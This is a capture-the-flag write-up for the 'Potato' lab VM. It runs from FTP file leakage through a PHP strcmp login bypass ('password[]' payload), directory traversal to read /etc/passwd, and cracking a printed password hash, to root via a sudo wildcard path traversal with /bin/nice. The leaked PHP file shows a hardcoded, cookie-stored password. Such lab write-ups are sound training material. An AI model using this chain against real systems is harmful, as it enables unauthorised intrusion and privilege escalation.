# Potato

`netdiscover` find the box running on this IP

```
192.168.1.116
```

Port scan reveals port 80 (http) and 2112 (ftp).

Found these files on ftp server

`index.php.bak`
```php
<html>                                                                                                        
<head></head>                                                                                                 
<body>                                                                                                        
                                                                                                              
<?php                                                                                                         
                                                                                                              
$pass= "potato"; //note Change this password regularly                                                        
                                                                                                              
if($_GET['login']==="1"){                                                                                     
  if (strcmp($_POST['username'], "admin") == 0  && strcmp($_POST['password'], $pass) == 0) {                  
    echo "Welcome! </br> Go to the <a href=\"dashboard.php\">dashboard</a>";                                  
    setcookie('pass', $pass, time() + 365*24*3600);                                                           
  }else{                                                                                                      
    echo "<p>Bad login/password! </br> Return to the <a href=\"index.php\">login page</a> <p>";               
  }                                                                                                           
  exit();                                                                                                     
}
?>
	
  <form action="index.php?login=1" method="POST">
                <h1>Login</h1>
                <label><b>User:</b></label>
                <input type="text" name="username" required>
                </br>
                <label><b>Password:</b></label>
                <input type="password" name="password" required>
                </br>
                <input type="submit" id='submit' value='Login' >
  </form>
</body>
</html>
```

and 

`welcome.msg` which didnt' have interesting content.

After doing some research, we find that [strcmp is not secure](https://www.doyler.net/security-not-included/bypassing-php-strcmp-abctf2016) enough to use for login.
We send the recommended payload which grants us access to the admin area

![[Pasted image 20220629213300.png]]

![[Pasted image 20220629213306.png]]

We then find out a parameter which controls the logs page is vulnerable to directory traversal. WE are able to get `/etc/passwd`

```
username=admin&password[]=%22%22
```

![[Pasted image 20220629220607.png]]

![[Pasted image 20220629214158.png]]

From that file, we get the names of 3 users which can be used to spawn a shell session:

```
root:x:0:0:root:/root:/bin/bash
florianges:x:1000:1000:florianges:/home/florianges:/bin/bash
webadmin:$1$webadmin$3sXBxGUtDGIFAcnNTNhi6/:1001:1001:webadmin,,,:/home/webadmin:/bin/bash
```

We noticed the user `webadmin` has a hash in their entry. THis was cracked with hashcat and found to be

```password
dragon
```

with `sudo -l`

![[Pasted image 20220702224844.png]]

 we found the user was allowed to run the below command as root

```
sudo /bin/nice /notes/*
```

we were able to use directory traversal to get an interactive bash session as root

```bash
sudo /bin/nice /notes/../../../../../bin/bash -i
```

## Root flag

![[Pasted image 20220702225350.png]]